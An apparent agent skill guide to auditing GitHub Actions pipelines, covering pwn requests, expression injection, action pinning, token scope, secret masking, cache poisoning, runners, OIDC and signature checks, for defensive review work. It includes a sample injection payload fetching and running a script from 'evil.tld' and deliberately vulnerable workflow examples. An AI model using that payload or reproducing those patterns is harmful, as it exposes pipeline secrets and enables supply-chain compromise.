---
name: ci-cd-security
description: Audits CI/CD pipelines — primarily GitHub Actions workflows — as an attack surface in their own right. Covers pwn requests (`pull_request_target` / `workflow_run` / `issue_comment` combined with a checkout of PR-head code), expression injection of attacker-controlled text into `run:` blocks, actions pinned to mutable tags instead of full commit SHAs, `GITHUB_TOKEN` permissions left at the default, secrets exposed to forks or leaked past log masking, cache and artifact poisoning, self-hosted runners on public repos, OIDC trust policies that pin `aud` but not `sub`, and verifying signed artifacts with cosign keyless identity or `gh attestation verify`. Use whenever the project has a `.github/workflows/` directory, when reviewing or writing a workflow file, when a pipeline handles secrets or deploys to a cloud, or when auditing how build artifacts are produced and verified. For the packages a pipeline installs, see secaudit:supply-chain.
license: MIT
---

# CI/CD Security (GitHub Actions)

Your CI pipeline is the most privileged thing in the repository. It holds every deploy credential,
it can write to the default branch, it publishes your packages, and it runs code on every push —
including pushes written by strangers. Unlike your application, nobody puts it behind a login or
reviews it after the day it was written.

The recurring AI-codegen failure mode is a workflow that *works*: it builds, it comments on the PR,
it deploys. Getting there means reaching for the trigger with the most privilege
(`pull_request_target`, because `pull_request` cannot read secrets), checking out the PR's code
because that is what you want to test, interpolating `${{ github.event.pull_request.title }}`
straight into a `run:` block because that is the obvious way to read it, and writing
`uses: some-org/action@v1` because that is what the README said. Each of those is the documented
exploit for its category. The workflow is not broken — it is a remote code execution endpoint that
passes CI.

Findings map to OWASP **A03:2025** (Software Supply Chain Failures) — a mutable or compromised
action is a dependency compromise — and **A08:2025** (Software or Data Integrity Failures): a
poisoned cache, an unverified artifact, or a loose OIDC trust policy each break the chain between
the source you reviewed and the bytes you shipped.

`secaudit:supply-chain` covers the packages a pipeline *installs*. This skill covers the pipeline
itself: the trigger, the token, the runner, the cache, and the signature on what comes out.

## When to Use

- The repository has `.github/workflows/`, a `.gitlab-ci.yml`, or any pipeline config.
- Writing or reviewing a workflow, especially one reacting to pull requests, issues, or comments.
- A pipeline holds deploy credentials, publishes a package, or assumes a cloud role.
- Auditing how build artifacts are produced, attested, and verified before deployment.

Review grep heuristics — these find most of it:

```bash
grep -rnE 'pull_request_target|workflow_run|issue_comment' .github/workflows/   # §1 triggers
grep -rnE 'ref:\s*\$\{\{\s*github\.event\.(pull_request\.head|workflow_run)' .github/workflows/
grep -rnE 'run:.*\$\{\{\s*github\.(event|head_ref)' .github/workflows/          # §2 injection
grep -rnE 'uses:\s*[^./][^@]+@(v?[0-9]|main|master)' .github/workflows/         # §3 unpinned
grep -rLE '^\s*permissions:' .github/workflows/*.y*ml                           # §4 no floor
grep -rnE 'self-hosted|cache-mode|persist-credentials|download-artifact|id-token' \
  .github/workflows/                                                            # §6-§8
```

## 1. Pwn Requests: A Privileged Trigger That Checks Out Untrusted Code

**What to look for:** a workflow on `pull_request_target`, `workflow_run`, or `issue_comment` that
checks out code the PR author controls — `ref: ${{ github.event.pull_request.head.sha }}`,
`head.ref`, `github.event.workflow_run.head_sha`, or a manual `git fetch` of the fork — and then
runs anything that executes repository code: `npm ci`/`npm install` (lifecycle scripts), `pnpm
install`, `make`, a build, a test suite, a linter with a local config, a preview deploy.

**Why it's exploitable:** these triggers are privileged by design. GitHub is blunt about it:
`pull_request_target` and `workflow_run`, "when used with the checkout of an untrusted pull
request, expose the repository to security compromises. These workflows are privileged, which
means they share the same cache of the main branch with other privileged workflow triggers, and
may have repository write access and access to referenced secrets." GitHub Security Lab puts it
more directly: "Workflows triggered via `pull_request_target` have write permission to the target
repository. They also have access to target repository secrets."

The attack is one pull request from a fork. No repository access, nothing merged — the job runs in
the base repository's context with secrets and a write token, which is exactly what a fork's
`pull_request` run does not get. `issue_comment` has the same shape: the workflow is read from the
default branch and runs privileged, so any commenter can trigger it. Twice in three months:

- **AsyncAPI, July 2026.** "On July 14, 2026, an attacker opened 37 pull requests to the AsyncAPI
  generator repository." `manual-netlify-preview.yml` "used `pull_request_target` to trigger on
  pull requests, but then checked out the pull request's code rather than the base branch." The run
  leaked an org-wide `asyncapi-bot` PAT, used to publish malicious `@asyncapi/generator` releases.
- **TanStack, May 2026.** A `bundle-size.yml` workflow on `pull_request_target` was step one of a
  chain that published 84 malicious versions across 42 `@tanstack/*` packages in six minutes.

**Fix:** never check out untrusted code in a privileged workflow. Split it: an unprivileged
`pull_request` job builds the PR code with no secrets and uploads an artifact; a privileged
`workflow_run` job consumes that artifact as *data* and never executes it. GitHub recommends this
split ("For privilege separation between workflows, `workflow_run` is a better trigger"), with the
caveat that the privileged half "should treat artifacts uploaded from other workflows with
caution" (§6). If you truly need `pull_request_target` — labelling, triage, a comment on a PR whose
code you never touch — omit `ref:` so you get the base branch, and keep it that way.

```yaml
# .github/workflows/preview.yml — BAD: a textbook pwn request
on:
  pull_request_target:                                     # privileged: secrets + write token
    types: [opened, synchronize]
jobs:
  preview:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker's code...
      - run: npm ci && npm run build                       # ...executes here
      - run: npx netlify deploy --auth ${{ secrets.NETLIFY_TOKEN }}
```

```yaml
# pr-build.yml — GOOD part 1: untrusted code, zero privilege
on: pull_request                     # fork PRs get no secrets and a read-only token
permissions: {}
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5.0.0
        with: { persist-credentials: false }               # §6
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with: { name: preview-dist, path: dist/ }
---
# pr-preview.yml — GOOD part 2: privilege, but nothing untrusted executes
on:
  workflow_run: { workflows: ["pr-build"], types: [completed] }
permissions:
  pull-requests: write               # the only privilege this job needs
jobs:
  comment:
    if: github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-latest
    steps:
      # no checkout of PR code at all; the artifact is data, never executed
      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
        with:
          name: preview-dist
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ secrets.GITHUB_TOKEN }}
      - run: ./scripts/publish-preview.sh dist             # script from the DEFAULT branch
```

**Detection:**

```bash
# Privileged trigger and a PR-head checkout in the same file — the pwn-request signature
for f in .github/workflows/*.y*ml; do
  grep -qE 'pull_request_target|workflow_run:|issue_comment' "$f" \
    && grep -qE 'head\.(sha|ref)|head_sha|head_branch' "$f" \
    && echo "PWN REQUEST CANDIDATE: $f"
done
grep -rlE 'pull_request_target' .github/workflows/ \
  | xargs grep -lE 'npm (ci|install)|pnpm install|yarn install|make |pip install' 2>/dev/null
```

## 2. Expression Injection Into `run:`

**What to look for:** a `${{ }}` expression carrying attacker-controlled text interpolated into a
`run:` block, an `actions/github-script` body, or any inline shell. GitHub Security Lab enumerates
the contexts an outsider can set — treat all fifteen as hostile input:

`github.event.issue.title`, `github.event.issue.body`, `github.event.pull_request.title`,
`github.event.pull_request.body`, `github.event.comment.body`, `github.event.review.body`,
`github.event.commits.*.message`, `github.event.head_commit.message`,
`github.event.head_commit.author.email`, `github.event.head_commit.author.name`,
`github.event.commits.*.author.email`, `github.event.commits.*.author.name`,
`github.event.pull_request.head.ref`, `github.event.pull_request.head.label`, `github.head_ref`.

**Why it's exploitable:** `${{ }}` is not a shell variable. The runner performs *textual
substitution* into the script before `bash` sees it, so the value becomes part of the program. A PR
titled ``a"; curl evil.tld/x.sh | sh; #`` is not read as a string — it runs. No fork checkout and
no privileged trigger required: on any workflow with secrets, the injected command reads them out
of the environment. The branch-name contexts (`github.head_ref`, `head.ref`) are the sneaky ones,
because a branch name looks like metadata; it isn't, the PR author chooses it.

**Fix:** pass untrusted values through an intermediate environment variable. GitHub states the rule
outright: "For inline scripts, the preferred approach to handling untrusted input is to set the
value of the expression to an intermediate environment variable ... the value of the
`${{ github.event.pull_request.title }}` expression is stored in memory and used as a variable, and
doesn't interact with the script generation process." Then quote the variable — env indirection
stops code injection, not word splitting.

```yaml
# BAD — the PR title is spliced into the program text
- run: |
    if [[ "${{ github.event.pull_request.title }}" =~ ^feat ]]; then echo ok; fi
```

```yaml
# GOOD — the title is data in the environment, never part of the script
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: |
    if [[ "$TITLE" =~ ^feat ]]; then echo ok; fi
```

Same rule for `actions/github-script` (use `process.env.TITLE`, not `${{ }}` inside the JS body)
and for any action input built by concatenating event text. Expressions that are *not*
attacker-controlled — `github.repository`, `github.run_id`, `github.sha`, your own `vars` — are
fine inline; the list above is the one to guard.

**Detection:**

```bash
grep -rnE '\$\{\{[^}]*github\.(event|head_ref)[^}]*\}\}' .github/workflows/ | grep -iE 'run:|script:'
grep -rnE '\$\{\{\s*github\.(head_ref|event\.(issue|pull_request|comment|review)\.(title|body))' \
  .github/workflows/
# actionlint reports exactly this class: "'github.event.head_commit.message' is potentially
# untrusted. avoid using it directly in inline scripts."
actionlint
```

## 3. Unpinned Actions: A Tag Is Not an Immutable Reference

**What to look for:** `uses:` referencing an action by tag (`@v4`, `@v4.1.2`), by branch (`@main`),
or by a moving major (`@v1`); a Docker action on an image tag rather than a digest; reusable
workflows (`uses: org/repo/.github/workflows/x.yml@v1`) pinned the same loose way.

**Why it's exploitable:** a git tag is a mutable pointer. The owner — or anyone who compromises the
owner's account or a maintainer's token — can repoint `v4` at a new commit, and every workflow that
says `@v4` picks it up on its next run, with no version change, no diff, no notification. GitHub:
"Pinning an action to a full-length commit SHA is currently the only way to use an action as an
immutable release ... there is risk to this approach even if you trust the author, because a tag
can be moved or deleted if a bad actor gains access to the repository storing the action."

**tj-actions/changed-files, March 2025** is the canonical demonstration (GHSA-mrrh-fwg8-r2c3 /
CVE-2025-30066, CVSS 8.6, **on the CISA KEV catalog since 2025-03-18** — confirmed exploitation,
not a theoretical score): "Attackers retroactively modified multiple version tags to reference a
malicious commit, exposing CI/CD secrets in workflow logs." The payload "targeted the Runner Worker
process, extracting and exfiltrating its memory contents" into the build log — world-readable on a
public repository. Versions through v45.0.7 were exposed; CVE-2025-30066 is patched in 46.0.1.
Every repository pinned to `@v45` was compromised the moment the tags moved; every repository
pinned to a SHA was untouched, because the SHA still pointed at reviewed code. A year later,
SHA-pinning all third-party actions was one of TanStack's remediation steps.

**Fix:** pin every action to a full 40-character commit SHA with the version in a trailing comment,
so Dependabot/Renovate can still bump it. Verify the SHA is from the action's own repository, not a
fork. Pin first-party `actions/*` too — the lesson is about tags, not owners. GitHub supports
repository- and organization-level policies that *require* SHA pinning; enable them so the next
workflow someone adds cannot regress.

```yaml
# BAD — three mutable references, any of which can be repointed under you
- uses: actions/checkout@v5
- uses: tj-actions/changed-files@v45
- uses: some-org/deploy-action@main
```

```yaml
# GOOD — immutable, and still auto-updatable because the comment carries the version
- uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5.0.0
- uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
```

**Detection:**

```bash
grep -rnE 'uses:\s*[^#]*@' .github/workflows/ */action.y*ml 2>/dev/null \
  | grep -vE '@[0-9a-f]{40}' | grep -vE 'uses:\s*\./'
zizmor .github/workflows/          # audit name: unpinned-uses
```

## 4. `GITHUB_TOKEN` Permissions Left at the Default

**What to look for:** a workflow with no `permissions:` key at all (the common case in generated
workflows), a top-level `permissions: write-all`, or a job granted scopes it never uses —
`contents: write` on a test job, `packages: write` on a linter.

**Why it's exploitable:** `GITHUB_TOKEN` is ambient. Every step in the job can read it, including a
third-party action you did not audit (§3) and an injected command (§2), so its scope is the blast
radius of *any* code execution in that job. With `contents: write` a compromised step pushes to the
default branch; with `packages: write` it publishes; with `actions: write` it rewrites the
workflows themselves.

The default is not reliably safe. The per-repository setting offers "read and write access for all
permissions (the permissive setting)" or "just read access for the `contents` and `packages`
permissions (the restricted setting)", and while new personal-account repositories start
restricted, an organization repository "is inherited from what is configured in the organization
settings" — so a workflow with no block inherits whatever an admin chose years ago.

**Fix:** put `permissions: {}` at the top of every workflow — GitHub documents this syntax "to
disable permissions for all of the available permissions" — and grant back the minimum per job:
"It's good security practice to set the default permission for the `GITHUB_TOKEN` to read access
only for repository contents. The permissions can then be increased, as required, for individual
jobs within the workflow file."

```yaml
# BAD — no permissions block; the job inherits whatever the org default happens to be
name: CI
on: [push, pull_request]
jobs:
  test: { runs-on: ubuntu-latest }
```

```yaml
# GOOD — deny by default at the top, grant per job, nothing wider than the job's actual work
name: CI
on: [push, pull_request]
permissions: {}                      # explicit floor for every job in this file
jobs:
  test:
    runs-on: ubuntu-latest
    permissions: { contents: read }  # just enough to check out
  release:
    needs: test
    runs-on: ubuntu-latest
    permissions:
      contents: write                # creates the tag and release
      id-token: write                # OIDC for keyless signing (§8, §9)
      attestations: write            # publishes the provenance attestation
```

Two related notes. `secrets: inherit` on a reusable-workflow call hands the callee *every* secret
in the repository — pass named secrets instead. And fork pull requests cannot be granted write
scopes through `permissions:` anyway ("you can use the `permissions` key to add and remove read
permissions for forked repositories, but typically you can't grant write access") — except where an
admin enabled "Send write tokens to workflows from pull requests", which turns every fork PR into
§1.

**Detection:**

```bash
grep -rLE '^\s*permissions:' .github/workflows/*.y*ml
grep -rnE 'permissions:\s*(write-all|read-all)|secrets:\s*inherit' .github/workflows/
# zizmor: excessive-permissions, secrets-inherit · Scorecard: Token-Permissions (Risk: High)
```

## 5. Secrets: the Fork Boundary, Masking Limits, and Debug Logging

**What to look for:** a secret interpolated into a `run:` block that prints it or passes it to a
verbose tool; `env`, `printenv`, or `set` in a debug step; `toJSON(secrets)` or a base64/JSON
wrapper around a secret; `ACTIONS_STEP_DEBUG` / `ACTIONS_RUNNER_DEBUG` enabled on a repository that
takes outside contributions; a long-lived org-wide PAT in repository secrets where `GITHUB_TOKEN`
or an OIDC role would do.

**Why it's exploitable:** the fork boundary is the one thing working in your favour — "with the
exception of `GITHUB_TOKEN`, secrets are not passed to the runner when a workflow is triggered from
a forked repository" — and §1 and §4 are mostly about giving that protection away.

Masking is a best-effort filter, not a boundary. "Because there are multiple ways a secret value
can be transformed, automatic redaction is not guaranteed", and "Structured data can cause secret
redaction within logs to fail ... do not use a blob of JSON, XML, or YAML (or similar) to
encapsulate a secret value." Redaction is exact-match on the value the runner knows, so a base64
encoding, a URL-encoding, a substring, or a secret nested in a JSON payload prints in the clear. It
is also runner-local: "a secret will only be redacted if it was used within a job and is accessible
by the runner" — a secret scraped from another job's memory (the tj-actions payload, §3) is not
masked at all, because that runner never knew it. On a public repository the logs are
world-readable, which is why that payload simply printed to stdout and waited. `ACTIONS_STEP_DEBUG`
and `ACTIONS_RUNNER_DEBUG` make runs far more verbose, so leave them off outside active debugging
and treat logs produced while they were on as sensitive.

**Fix:** put secrets in `env` on the single step that needs them — never job- or workflow-wide,
never on a step running untrusted code — never echo or `cat` them, mask derived values with
`::add-mask::` before anything can print them, and prefer short-lived credentials (`GITHUB_TOKEN`,
or OIDC per §8) over a stored PAT. If an unredacted secret does reach a log: "you should delete the
log and rotate the secret" — rotation is the part that matters.

```yaml
# BAD — three leaks in four lines
- run: |
    echo "Deploying with ${{ secrets.DEPLOY_KEY }}"   # printed verbatim
    env                                               # dumps every secret in scope
    curl -v -H "Authorization: Bearer ${{ secrets.API_TOKEN }}" https://api.example.com/deploy
```

```yaml
# GOOD — scoped to one step, never printed, derived values masked
- name: Deploy
  env:
    DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
  run: |
    SESSION=$(./scripts/mint-session.sh)              # derived from the secret, so mask it
    echo "::add-mask::$SESSION"
    ./scripts/deploy.sh --quiet                       # reads $DEPLOY_KEY from the env
```

**Detection:**

```bash
grep -rnE '(echo|printf|print|cat).*\$\{\{\s*secrets\.' .github/workflows/
grep -rnE 'run:.*(^|[;&|[:space:]])(env|printenv|set)\s*$' .github/workflows/
grep -rnE 'toJSON\(secrets\)|base64.*secrets\.|secrets\..*\|\s*base64' .github/workflows/
grep -rnE 'ACTIONS_(STEP|RUNNER)_DEBUG' .github/
```

## 6. Cache and Artifact Poisoning

**What to look for:** `cache-mode: write` or `cache-mode: write-only` on a workflow triggered by
`pull_request_target`, `issue_comment`, or `workflow_run`; a cache key shared between a PR job and
a release job (a pnpm/npm store, a Docker layer cache, a build directory);
`actions/download-artifact` in a `workflow_run` workflow that executes what it downloaded;
`actions/checkout` with default `persist-credentials` in a job that uploads its workspace.

**Why it's exploitable:** four integrity failures sharing one root cause — CI trusts storage
because CI wrote it.

- **Cache poisoning.** Branches are the cache's security boundary, and the default branch's scope
  is readable by every branch beneath it. GitHub restricts writes from untrusted triggers by
  default and says why: "When these events run in the context of the default branch, they could be
  used to write a malicious cache that a later, more privileged workflow restores and trusts." The
  protection is opt-out, and opting out is a finding: "Explicitly declaring `cache-mode: write` or
  `cache-mode: write-only` reintroduces the risk of cache-poisoning." Step two of the TanStack
  compromise was exactly this — a poisoned pnpm store written from a PR run and restored by the
  release workflow on `main`.
- **Never cache credentials.** "Anyone with read access can create a pull request on a repository
  and access the contents of a cache." A cached `~/.npmrc` or `~/.aws/credentials` is a public file.
- **Artifact poisoning.** A `workflow_run` job downloading an artifact from a fork's
  `pull_request` run is consuming attacker-controlled bytes — "attackers replace the content of a
  legitimate artifact with a modified malicious one and thereby initiate a supply chain attack."
  Check it came from the run you expected, read it as data, never extract it over your workspace.
- **Artifacts carrying your token.** `actions/checkout` persists `GITHUB_TOKEN` into `.git/config`
  by default; uploading the workspace ships that token (and `ACTIONS_RUNTIME_TOKEN`) to anyone who
  can download it — the "ArtiPACKED" class. Set `persist-credentials: false` and never upload
  `.git`.

```yaml
# BAD — privileged trigger writing the shared cache, and an artifact carrying the git token
on: pull_request_target
jobs:
  size:
    steps:
      - uses: actions/checkout@v5
        with:
          ref: ${{ github.event.pull_request.head.sha }}            # §1 as well
      - uses: actions/cache@v4
        with:
          path: ~/.pnpm-store
          key: pnpm-${{ hashFiles('pnpm-lock.yaml') }}              # same key as release
          cache-mode: write
      - uses: actions/upload-artifact@v4
        with: { name: workspace, path: . }                          # .git/config → GITHUB_TOKEN
```

```yaml
# GOOD — unprivileged trigger, restore-only cache in its own namespace, narrow upload
on: pull_request
permissions: {}
jobs:
  size:
    steps:
      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5.0.0
        with: { persist-credentials: false }
      - uses: actions/cache/restore@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
        with:
          path: ~/.pnpm-store
          key: pnpm-pr-${{ hashFiles('pnpm-lock.yaml') }}           # release keys are separate
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with: { name: size-report, path: reports/size.json }        # one file, not the workspace
```

Give release and deploy workflows their own cache key prefix so no PR job can write what they read,
and purge caches after any suspected compromise (TanStack's remediation included exactly that).

**Detection:**

```bash
grep -rnE 'cache-mode:\s*write' .github/workflows/
grep -rn 'persist-credentials' .github/workflows/ || echo "never set: checkout leaves GITHUB_TOKEN in .git/config"
grep -rlE 'workflow_run' .github/workflows/ | xargs grep -ln 'download-artifact' 2>/dev/null
grep -rnE -A4 'upload-artifact' .github/workflows/ | grep -E "path:\s*(\.|\$\{\{\s*github\.workspace)"
# zizmor audits: cache-poisoning, artipacked
```

## 7. Self-Hosted Runners on Public Repositories

**What to look for:** `runs-on: self-hosted` (or a custom label group) in a public repository, or
in a private/internal one where anyone who can fork can open a PR.

**Why it's exploitable:** a self-hosted runner is a machine you own, usually on a network you care
about, executing whatever the workflow says — on a public repository, that means any stranger's
pull request. GitHub's position is unusually strong: "self-hosted runners should almost never be
used for public repositories on GitHub, because any user can open pull requests against the
repository and compromise the environment. Similarly, be cautious when using self-hosted runners on
private or internal repositories, as anyone who can fork the repository and open a pull request ...
are able to compromise the self-hosted runner environment, including gaining access to secrets and
the `GITHUB_TOKEN`."

The second failure is persistence: the machine survives the job. "There is no way to guarantee that
a self-hosted runner only runs one job", so one malicious PR can leave behind a modified toolchain,
a poisoned dependency cache, or a shell waiting for the next job — the one with deploy credentials.

**Fix:** use GitHub-hosted runners for anything a fork can trigger. Where self-hosted is genuinely
required (a GPU, a licensed toolchain, network-local resources), make it **ephemeral** — a
just-in-time runner that registers for one job and is destroyed — in an isolated network segment
with no path to production and no ambient cloud credentials, and never let a fork-triggered
workflow select it.

```yaml
# BAD — public repo, self-hosted runner, fork PRs welcome
on: pull_request
jobs:
  build:
    runs-on: [self-hosted, linux, gpu]
```

```yaml
# GOOD — untrusted triggers stay on hosted runners; the self-hosted pool is gated
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest           # fork PRs never touch owned hardware
  gpu-bench:
    if: github.event.pull_request.head.repo.full_name == github.repository   # never forks
    environment: gpu-bench           # required reviewers gate the run
    runs-on: [self-hosted, ephemeral, gpu]
```

**Detection:**

```bash
grep -rnE 'runs-on:.*self-hosted' .github/workflows/
gh repo view --json visibility -q .visibility            # is this public?
grep -rlE 'runs-on:.*self-hosted' .github/workflows/ \
  | xargs grep -lE 'on:\s*(\[.*)?pull_request' 2>/dev/null
# zizmor audit: self-hosted-runner
```

## 8. OIDC Trust Policies That Trust Too Much

**What to look for:** a cloud IAM role trusted by `token.actions.githubusercontent.com` whose
condition checks only the audience (`aud`), or whose `sub` uses a wildcard like `repo:my-org/*:*`;
`id-token: write` granted workflow-wide rather than on the one job that needs it; a trust policy
written for the classic `sub` format on a repository that now issues the immutable format.

**Why it's exploitable:** OIDC is the right answer to long-lived cloud keys — "the job or workflow
must grant the `id-token: write` permission to allow GitHub's OIDC provider to create a JSON Web
Token" — but the security lives entirely in the conditions the *cloud* checks. "Audience and
subject claims are typically used in combination while setting conditions on the cloud
role/resources to scope its access to the GitHub workflows."

`aud` alone is not a scope: it defaults to the URL of the repository owner, so an `aud`-only policy
accepts a token from any repository in your organization, on any branch. Only `sub` (optionally
with `repository`, `ref`, `environment`, `workflow_ref`) narrows it to the workflow you meant. Two
formats exist and you must match the right one:

- **Classic:** `repo:ORG-NAME/REPO-NAME:ref:refs/heads/BRANCH-NAME`, `...:ref:refs/tags/TAG-NAME`,
  `...:environment:ENVIRONMENT-NAME`, `...:pull_request`.
- **Immutable** — "for repositories created after July 15, 2026, or that have opted in to immutable
  subject claims, the `sub` claim includes owner_id and repo_id":
  `repo:OWNER@OWNER-ID/REPO@REPO-ID:ref:refs/heads/BRANCH`. A policy written for the classic string
  silently stops matching; a wildcard written to cover both matches more than you think.

Dependabot update jobs request tokens with an `event_name` claim of `dynamic` — if you filter on
`event_name`, allow only the events you expect.

**Fix:** condition on `sub` with an exact string (or the narrowest pattern), keep `aud` as a
secondary check rather than the only one, prefer an `environment:` subject so environment
protection rules gate the deploy too, and grant `id-token: write` on the deploy job only.

```jsonc
// BAD — any repo, any branch under this owner can assume the role
"Condition": {
  "StringEquals": { "token.actions.githubusercontent.com:aud": "sts.amazonaws.com" }
}
```

```jsonc
// GOOD — one repo, one environment, audience checked as well
"Condition": {
  "StringEquals": {
    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
    "token.actions.githubusercontent.com:sub": "repo:octo-org/octo-repo:environment:production"
  }
}
```

```yaml
# GOOD — id-token scoped to the deploy job, environment gate applies
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    permissions: { id-token: write, contents: read }
    steps:
      - uses: aws-actions/configure-aws-credentials@e1253824e5c10ff9df46874f81ed3ec929e19cfd # v6.3.0
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
          aws-region: us-east-1
```

**Detection:**

```bash
grep -rn 'id-token' .github/workflows/                   # which jobs request a token, how widely
grep -rlE 'token\.actions\.githubusercontent\.com' --include='*.tf' --include='*.json' . \
  | xargs grep -LE ':sub' 2>/dev/null                    # trust policies with no subject condition
aws iam get-role --role-name gha-deploy --query 'Role.AssumeRolePolicyDocument'   # read-only
```

## 9. Verifying Signed Artifacts — and Checking Who Signed Them

**What to look for:** a deploy or install step that pulls a release binary, container image, or
SBOM and never verifies it; `cosign verify` with no `--certificate-identity` /
`--certificate-identity-regexp`, or a regexp loose enough to match any repository (`.*`,
`^https://github.com/.*`); `gh attestation verify` without `--signer-workflow` or `--signer-repo`;
a release workflow producing artifacts with no provenance at all.

**Why it's exploitable:** "signed" means nothing without "signed *by whom, from where*". In keyless
(Sigstore) signing anyone can obtain a valid Fulcio certificate and produce a cryptographically
perfect signature, so the certificate's *identity* is the authorization decision — and cosign will
not let you skip it: "Either `--certificate-identity` or `--certificate-identity-regexp` must be
set for keyless flows." A wildcard identity is the same as no verification: the attacker signs
their build with their own workflow's identity and your check passes.

**Fix:** pin both identity and issuer. For artifacts built by GitHub Actions the identity is the
workflow URL and the issuer is `https://token.actions.githubusercontent.com`.

```bash
# BAD — the signature is valid; that tells you nothing about who made it
cosign verify ghcr.io/acme/app:1.4.0
cosign verify ghcr.io/acme/app:1.4.0 --certificate-identity-regexp '.*' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com
```

```bash
# GOOD — only a release-tag run of acme/app's own release workflow satisfies this
cosign verify ghcr.io/acme/app:1.4.0 \
  --certificate-identity-regexp '^https://github.com/acme/app/\.github/workflows/release\.yml@refs/tags/v.*$' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com
```

On the producing side, GitHub's artifact attestations give the same guarantee with less ceremony:
add `actions/attest-build-provenance` (a wrapper on `actions/attest` since v4) to the release job
with `id-token: write`, `attestations: write`, and `contents: read`. On the consuming side, verify
with the signer pinned — `--signer-workflow` enforces "that the workflow that signed the
attestation matches the provided value":

```bash
gh attestation verify ./app-linux-amd64 -R acme/app \
  --signer-workflow acme/app/.github/workflows/release.yml
gh attestation verify oci://ghcr.io/acme/app:1.4.0 -R acme/app \
  --signer-workflow acme/app/.github/workflows/release.yml
```

Verification belongs in the *consuming* pipeline — the deploy job, the base image build, the
installer — not only as a release-time nicety, and it must fail the build rather than warn.

**Detection:**

```bash
grep -rn 'cosign verify' . | grep -v 'certificate-identity'          # unverified identity
grep -rn 'certificate-identity-regexp' . | grep -E "'\.\*'|github\.com/\.\*"
grep -rn 'attestation verify' . | grep -v 'signer-workflow\|signer-repo'
grep -rlE '(curl|wget).*releases/download' .github/workflows/ \
  | xargs grep -Ln 'cosign|attestation verify|sha256sum -c' 2>/dev/null
```

## 10. Tooling, and the GitLab Mapping

Three scanners cover most of this skill mechanically; run them in CI against the workflows.

- **zizmor** — "a static analysis tool for CI/CD systems", with audits matching the sections above
  almost one for one: `dangerous-triggers` (§1), `template-injection` (§2), `unpinned-uses` (§3),
  `excessive-permissions` and `secrets-inherit` (§4), `cache-poisoning` and `artipacked` (§6),
  `self-hosted-runner` (§7), plus `bot-conditions`.
- **actionlint** — "static checker for GitHub Actions workflow files", including "security checks;
  script injection by untrusted inputs, hard-coded credentials". Catches §2 precisely.
- **OpenSSF Scorecard** — `Dangerous-Workflow` (Risk: Critical — untrusted checkout and script
  injection), `Token-Permissions` (Risk: High), `Pinned-Dependencies` (Risk: Medium, "a dependency
  that is explicitly set to a specific hash instead of allowing a mutable version or range of
  versions"). GitHub's own hardening guidance endorses it: "The Scorecards project runs a number of
  checks, including script injection attacks, token permissions, and pinned actions."

**GitLab CI, in one paragraph.** The categories transfer even though the syntax does not. The
pwn-request equivalent (§1) is the fork merge-request pipeline: it "is created and runs in the
parent (target) project, not the fork (source) project", and GitLab warns that "fork merge requests
can contain malicious code that tries to steal secrets in the parent project when the pipeline
runs, even before merge" — a maintainer clicking "Run pipeline" on a fork MR is doing what
`pull_request_target` plus a PR-head checkout does. `CI_JOB_TOKEN` is the `GITHUB_TOKEN` analogue
for §4: it "receives the same access level as the user that triggered the pipeline", "after the job
finishes, the token access is revoked", and the job-token allowlist is the least-privilege knob
(you must explicitly add a group or project to it). Expression injection (§2) has the same shape
wherever `CI_COMMIT_MESSAGE`, `CI_MERGE_REQUEST_TITLE`, or a branch name is interpolated into a
`script:` block — treat those exactly like `github.event.*`. Pinning (§3), masked-variable limits
(§5), runner isolation (§7), and OIDC subject pinning (§8) map across directly.

## CI/CD Footgun Checklist

- `pull_request_target` / `workflow_run` / `issue_comment` in the same file as a PR-head checkout —
  remote code execution with your secrets, not a lint warning.
- Any `github.event.*` or `github.head_ref` expression inside `run:` — move it to `env:`, quote it.
- `uses:` on a mutable tag or branch — tj-actions showed the tag being moved under everyone.
- No top-level `permissions:` block — the token's scope is whatever an org admin set years ago.
- `secrets: inherit` on a reusable workflow call — pass named secrets instead.
- A secret echoed, dumped via `env`, or wrapped in JSON/base64 — masking is exact-match and fails.
- `ACTIONS_STEP_DEBUG` left enabled on a repo that takes outside contributions.
- `cache-mode: write` on an untrusted trigger, or one cache key shared by PR and release jobs.
- Credentials cached, or the whole workspace uploaded as an artifact (`.git/config` holds
  `GITHUB_TOKEN`) — set `persist-credentials: false`.
- `download-artifact` from a fork's run, then executed instead of read.
- `runs-on: self-hosted` on anything a fork PR can trigger; non-ephemeral runners generally.
- An OIDC trust policy keyed on `aud` only, a `sub` wildcard, or the wrong `sub` format after the
  immutable-claims change.
- `id-token: write` at workflow level rather than on the single deploy job.
- `cosign verify` with no identity or a `.*` regexp; `gh attestation verify` with no
  `--signer-workflow`; a release binary downloaded in a deploy pipeline and never verified at all.

## Cross-References

- `secaudit:supply-chain` — the packages a pipeline installs: hallucinated/typosquatted
  dependencies, lock-file hygiene, npm provenance, post-install hooks. This skill covers the
  workflow that runs the install; that one covers what gets installed.
- `secaudit:secrets` — how a credential reaches the repository, and what to do after one leaks.
- `secaudit:docker-security` — build-time secrets in image layers and base-image pinning: the same
  digest-over-tag argument as §3, one layer down.
- `secaudit:deployment` — environment separation and preview-deployment isolation, where a
  compromised pipeline lands.
